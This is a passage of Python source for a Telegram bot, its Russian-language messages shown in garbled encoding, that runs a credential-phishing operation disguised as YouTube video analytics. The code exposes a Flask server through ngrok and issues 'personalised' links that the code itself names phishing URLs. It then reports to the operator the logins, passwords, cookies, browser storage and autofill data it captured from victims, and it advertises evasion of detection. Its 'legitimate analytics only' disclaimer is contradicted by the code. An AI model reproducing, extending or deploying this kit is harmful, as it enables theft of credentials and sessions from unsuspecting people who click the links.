        public_url = ngrok_manager.start(FLASK_PORT)
        
        if public_url:
            current_ngrok_url = public_url
            
            message = f"""
‚úÖ *–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω!*

üîó *–í–∞—à URL:* {public_url}

üåê *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤—ã—à–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ
2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
3. –ü–æ–ª—É—á–∏—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É
4. –ü–æ–¥–µ–ª–∏—Ç–µ—Å—å –µ–π
5. –ê–Ω–∞–ª–∏—Ç–∏–∫–∞ –±—É–¥–µ—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

üì° *–ü–æ—Ä—Ç:* {FLASK_PORT}
‚è± *–ó–∞–ø—É—â–µ–Ω:* {datetime.now().strftime('%H:%M:%S')}

‚ö†Ô∏è *–ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É!*
–°–µ—Ä–≤–µ—Ä –∞–∫—Ç–∏–≤–µ–Ω –ø–æ–∫–∞ –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç.
"""
            
            keyboard = [
                [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ", url=public_url)],
                [InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Ä–≤–µ—Ä", callback_data="stop_ngrok")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                "‚ùå *–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä!*\n\n"
                "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ:\n"
                "1. –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ª–∏ pyngrok (`pip install pyngrok`)\n"
                "2. –í–µ—Ä–Ω—ã–π –ª–∏ auth token\n"
                "3. –ü–æ—Ä—Ç {FLASK_PORT} —Å–≤–æ–±–æ–¥–µ–Ω\n\n"
                "–°–∫–∞—á–∞–π—Ç–µ ngrok: https://ngrok.com/download",
                parse_mode=ParseMode.MARKDOWN
            )
    
    except Exception as e:
        logger.error(f"Error starting ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def stop_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ ngrok"""
    global current_ngrok_url
    
    try:
        if ngrok_manager:
            ngrok_manager.stop()
            current_ngrok_url = None
        
        await update.message.reply_text(
            "üõë *–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!*\n\n"
            "–í—Å–µ —Å—Å—ã–ª–∫–∏ –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã.\n"
            "–î–ª—è –∑–∞–ø—É—Å–∫–∞: /start_ngrok",
            parse_mode=ParseMode.MARKDOWN
        )
    
    except Exception as e:
        logger.error(f"Error stopping ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def get_url_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ URL —Å–µ—Ä–≤–µ—Ä–∞"""
    global current_ngrok_url
    
    if not current_ngrok_url:
        await update.message.reply_text(
            "‚ùå *–°–µ—Ä–≤–µ—Ä –Ω–µ –∑–∞–ø—É—â–µ–Ω!*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start_ngrok –¥–ª—è –∑–∞–ø—É—Å–∫–∞",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = f"""
üåê *URL –≤–∞—à–µ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞:*

üîó {current_ngrok_url}

üí° *–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:*
1. –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ
2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
3. –ü–æ–ª—É—á–∏—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É
4. –ü–æ–¥–µ–ª–∏—Ç–µ—Å—å –µ–π
5. –ê–Ω–∞–ª–∏—Ç–∏–∫–∞ –ø—Ä–∏–¥–µ—Ç —Å—é–¥–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

‚ö° *–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:*
‚Ä¢ –í–∏–¥–µ–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è –∫–∞–∫ –Ω–∞ YouTube
‚Ä¢ –°–±–æ—Ä –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
‚Ä¢ –°–æ–≤—Ä–µ–º–µ–Ω–Ω–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è
‚Ä¢ –ê–Ω–æ–Ω–∏–º–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
"""
    
    keyboard = [
        [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ", url=current_ngrok_url)],
        [InlineKeyboardButton("üöÄ –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É", url=f"{current_ngrok_url}/phishing_home")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã"""
    stats = db.get_stats()
    
    message = f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ò–°–¢–ï–ú–´*

üîó *–û—Å–Ω–æ–≤–Ω—ã–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏:*
‚Ä¢ –°–æ–∑–¥–∞–Ω–æ —Å—Å—ã–ª–æ–∫: `{stats.get('total_links', 0)}`
‚Ä¢ –í—Å–µ–≥–æ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤: `{stats.get('total_clicks', 0)}`
‚Ä¢ –î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ: `{stats.get('total_captured', 0)}`
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π: `{stats.get('total_credentials', 0)}`
‚Ä¢ Cookies: `{stats.get('total_cookies', 0)}`

üåê *–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞:*
‚Ä¢ –°—Ç–∞—Ç—É—Å: {'üü¢ –ê–∫—Ç–∏–≤–µ–Ω' if current_ngrok_url else 'üî¥ –ù–µ–∞–∫—Ç–∏–≤–µ–Ω'}
‚Ä¢ URL: {current_ngrok_url or '–ù–µ –∑–∞–ø—É—â–µ–Ω'}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä
‚Ä¢ /get_url - –ü–æ–ª—É—á–∏—Ç—å URL
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
"""
    
    keyboard = [
        [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data="stats")],
        [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä", callback_data="start_ngrok")],
        [InlineKeyboardButton("üîó –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")]
    ]
    
    if current_ngrok_url:
        keyboard[1] = [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å —Å–µ—Ä–≤–µ—Ä", url=current_ngrok_url)]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def my_links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ú–æ–∏ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏"""
    user_id = update.effective_user.id
    links = db.get_user_links(user_id)
    
    if not links:
        await update.message.reply_text(
            "üì≠ *–£ –≤–∞—Å –Ω–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫.*\n\n"
            "–ß—Ç–æ–±—ã —Å–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É:\n"
            "1. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä: /start_ngrok\n"
            "2. –ü–æ–ª—É—á–∏—Ç–µ URL: /get_url\n"
            "3. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ\n"
            "4. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ\n"
            "5. –ü–æ–ª—É—á–∏—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = "üîó *–í–ê–®–ò –ü–ï–†–°–û–ù–ê–õ–ò–ó–ò–†–û–í–ê–ù–ù–´–ï –°–°–´–õ–ö–ò:*\n\n"
    
    for i, link in enumerate(links[:10], 1):
        data_count = len(db.get_data_by_link(link['id']))
        
        message += f"{i}. *ID:* `{link['id']}`\n"
        message += f"   üé¨ –í–∏–¥–µ–æ: {link['youtube_id']}\n"
        message += f"   üìÖ –°–æ–∑–¥–∞–Ω–æ: {link['created_at'][:10]}\n"
        message += f"   üë£ –ü–µ—Ä–µ—Ö–æ–¥–æ–≤: {link['clicks']}\n"
        message += f"   üìä –î–∞–Ω–Ω—ã—Ö: {data_count}\n"
        message += f"   üîó –°—Å—ã–ª–∫–∞: {link['phishing_url'][:50]}...\n"
        message += "   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
    
    if len(links) > 10:
        message += f"\n... –∏ –µ—â–µ {len(links) - 10} —Å—Å—ã–ª–æ–∫\n"
    
    keyboard = []
    for link in links[:3]:
        keyboard.append([
            InlineKeyboardButton(f"üìä {link['id'][:8]}...", callback_data=f"link_info_{link['id']}")
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö"""
    if not context.args:
        await update.message.reply_text(
            "üìä *–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `/data [ID_–¥–∞–Ω–Ω—ã—Ö]`\n\n"
            "–ü—Ä–∏–º–µ—Ä: `/data abc123def456`\n\n"
            "ID –¥–∞–Ω–Ω—ã—Ö –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    data_id = context.args[0]
    data = db.get_captured_data(data_id)
    
    if not data:
        await update.message.reply_text(
            f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{data_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    link_info = db.get_link(data['link_id'])
    link_url = link_info['phishing_url'] if link_info else 'N/A'
    
    message = f"""
üîç *–î–ï–¢–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢ –û –î–ê–ù–ù–´–•*

üìå *–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä:* `{data['id']}`
üîó *–°—Å—ã–ª–∫–∞ ID:* `{data['link_id']}`
üïí *–í—Ä–µ–º—è —Å–±–æ—Ä–∞:* {data['timestamp'][:19]}
üåê *IP –∞–¥—Ä–µ—Å:* `{data['ip_address']}`
üë§ *User Agent:* {data['user_agent'][:80]}...

üìä *–°–û–ë–†–ê–ù–ù–´–ï –î–ê–ù–ù–´–ï:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ –õ–æ–≥–∏–Ω—ã: {len(data.get('logins', []))}
‚Ä¢ –ü–∞—Ä–æ–ª–∏: {len(data.get('passwords', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}
‚Ä¢ –î–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è: {len(data.get('autofill_data', {}))}

üíª *–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –£–°–¢–†–û–ô–°–¢–í–ï:*
‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {data.get('device_info', {}).get('platform', 'N/A')}
‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {data.get('device_info', {}).get('screen', {}).get('width', 0)}x{data.get('device_info', {}).get('screen', {}).get('height', 0)}
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: {data.get('device_info', {}).get('timezone', 'N/A')}
‚Ä¢ –Ø–∑—ã–∫: {data.get('user_agent', '').split(';')[0] if ';' in data.get('user_agent', '') else 'N/A'}
"""
    
    # –õ–æ–≥–∏–Ω—ã
    logins = data.get('logins', [])
    if logins:
        message += "\nüë§ *–ù–ê–ô–î–ï–ù–ù–´–ï –õ–û–ì–ò–ù–´:*\n"
        for login in logins[:5]:
            value = login.get('value', '')
            if value:
                message += f"‚Ä¢ `{value}`\n"
    
    # –ü–∞—Ä–æ–ª–∏
    passwords = data.get('passwords', [])
    if passwords:
        message += "\nüîë *–ù–ê–ô–î–ï–ù–ù–´–ï –ü–ê–†–û–õ–ò:*\n"
        for pwd in passwords[:3]:
            value = pwd.get('value', '')
            if value:
                message += f"‚Ä¢ `{value}`\n"
    
    message += f"""
üí° *–ö–û–ú–ê–ù–î–´:*
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "start_ngrok":
        await start_ngrok_command(query, context)
    
    elif data == "stop_ngrok":
        await stop_ngrok_command(query, context)
    
    elif data == "get_url":
        await get_url_command(query, context)
    
    elif data == "stats":
        await stats_command(query, context)
    
    elif data == "my_links":
        await my_links_command(query, context)
    
    elif data.startswith("link_info_"):
        link_id = data[10:]
        link = db.get_link(link_id)
        
        if link:
            data_list = db.get_data_by_link(link_id)
            
            message = f"""
üîó *–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–°–´–õ–ö–ï*

üìå *ID:* `{link['id']}`
üé¨ *YouTube ID:* {link['youtube_id']}
üîó *–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:* {link['youtube_url'][:50]}...
üåê *–ü–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞:* {link['phishing_url'][:50]}...
üìÖ *–°–æ–∑–¥–∞–Ω–æ:* {link['created_at'][:19]}
üë£ *–ü–µ—Ä–µ—Ö–æ–¥–æ–≤:* {link['clicks']}
üìä *–î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ:* {len(data_list)}

üìà *–ü–û–°–õ–ï–î–ù–ò–ï –î–ê–ù–ù–´–ï:*
"""
            
            for i, data_item in enumerate(data_list[:3], 1):
                message += f"\n{i}. *ID:* `{data_item['id']}`\n"
                message += f"   üïí {data_item['timestamp'][:16]}\n"
                message += f"   üåê {data_item['ip_address']}\n"
                message += f"   üë§ –õ–æ–≥–∏–Ω–æ–≤: {len(data_item.get('logins', []))}\n"
                message += f"   üîë –ü–∞—Ä–æ–ª–µ–π: {len(data_item.get('passwords', []))}\n"
            
            keyboard = [
                [InlineKeyboardButton("üìä –ü–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ –¥–∞–Ω–Ω—ã–µ", callback_data=f"show_all_data_{link_id}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
    
    try:
        error_msg = str(context.error)
        if len(error_msg) > 1000:
            error_msg = error_msg[:1000] + "..."
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"‚ö†Ô∏è *–û—à–∏–±–∫–∞ –≤ –±–æ—Ç–µ:*\n\n{error_msg}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

# ========== –ó–ê–ü–£–°–ö –°–ò–°–¢–ï–ú–´ ==========
def run_flask():
    """–ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞"""
    try:
        logger.info(f"Starting Flask server on port {FLASK_PORT}")
        app.run(
            host='0.0.0.0',
            port=FLASK_PORT,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Flask server error: {e}")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞"""
    global telegram_app
    
    print("=" * 70)
    print("ü§ñ YOUTUBE VIDEO ANALYTICS BOT")
    print("=" * 70)
    print()
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("‚ùå –û–®–ò–ë–ö–ê: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω BOT_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ —É @BotFather –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥ (—Å—Ç—Ä–æ–∫–∞ 22)")
        sys.exit(1)
    
    if NGROK_AUTH_TOKEN == "YOUR_NGROK_TOKEN_HERE":
        print("‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω NGROK_AUTH_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ngrok.com –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥ (—Å—Ç—Ä–æ–∫–∞ 23)")
        print("–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç")
        print("–ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –±–µ–∑ ngrok...")
    
    print("‚úÖ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞")
    print(f"üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {ADMIN_ID}")
    print(f"üåê –ü–æ—Ä—Ç Flask: {FLASK_PORT}")
    print()
    
    # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫–∏
    os.makedirs("screenshots", exist_ok=True)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    time.sleep(2)  # –î–∞–µ–º Flask –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫
    
    print("‚úÖ Flask —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É", FLASK_PORT)
    print("üîó –õ–æ–∫–∞–ª—å–Ω—ã–π URL: http://localhost:8080")
    print()
    
    # –°–æ–∑–¥–∞–µ–º Telegram –±–æ—Ç–∞
    try:
        telegram_app = Application.builder().token(BOT_TOKEN).build()
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
        telegram_app.add_handler(CommandHandler("start", start_command))
        telegram_app.add_handler(CommandHandler("start_ngrok", start_ngrok_command))
        telegram_app.add_handler(CommandHandler("stop_ngrok", stop_ngrok_command))
        telegram_app.add_handler(CommandHandler("get_url", get_url_command))
        telegram_app.add_handler(CommandHandler("stats", stats_command))
        telegram_app.add_handler(CommandHandler("my_links", my_links_command))
        telegram_app.add_handler(CommandHandler("data", data_command))
        telegram_app.add_handler(CommandHandler("help", start_command))
        
        # Inline –∫–Ω–æ–ø–∫–∏
        telegram_app.add_handler(CallbackQueryHandler(button_handler))
        
        # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
        telegram_app.add_error_handler(error_handler)
        
        print("‚úÖ Telegram –±–æ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω")
        print()
        print("=" * 70)
        print("üöÄ –°–ò–°–¢–ï–ú–ê –ì–û–¢–û–í–ê –ö –†–ê–ë–û–¢–ï!")
        print("=" * 70)
        print()
        print("üí° –ò–ù–°–¢–†–£–ö–¶–ò–Ø:")
        print("1. –ù–∞–ø–∏—à–∏—Ç–µ –±–æ—Ç—É /start")
        print("2. –ù–∞–∂–º–∏—Ç–µ '–ó–∞–ø—É—Å—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä' –∏–ª–∏ /start_ngrok")
        print("3. –ü–æ–ª—É—á–∏—Ç–µ URL —á–µ—Ä–µ–∑ /get_url")
        print("4. –û—Ç–∫—Ä–æ–π—Ç–µ URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ")
        print("5. –°–æ–∑–¥–∞–π—Ç–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É")
        print()
        print("‚ö° –û–°–û–ë–ï–ù–ù–û–°–¢–ò –°–ò–°–¢–ï–ú–´:")
        print("‚Ä¢ YouTube –≤–∏–¥–µ–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –∫–∞–∫ –Ω–∞—Å—Ç–æ—è—â–µ–µ")
        print("‚Ä¢ –°–æ–≤—Ä–µ–º–µ–Ω–Ω–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è")
        print("‚Ä¢ –°–±–æ—Ä –∞–Ω–∞–ª–∏—Ç–∏–∫–∏ –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ")
        print("‚Ä¢ –ê–Ω–æ–Ω–∏–º–Ω–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è")
        print("‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –±–∞–∑—É")
        print()
        print("üìÅ –°–æ–∑–¥–∞–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã:")
        print("‚Ä¢ youtube_phishing.db - –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö SQLite")
        print("‚Ä¢ youtube_phishing.log - –õ–æ–≥–∏ —Å–∏—Å—Ç–µ–º—ã")
        print()
        print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Å–±–æ—Ä–∞ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏!")
        print("    –£–≤–∞–∂–∞–π—Ç–µ –ø—Ä–∏–≤–∞—Ç–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        print("=" * 70)
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)
        
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
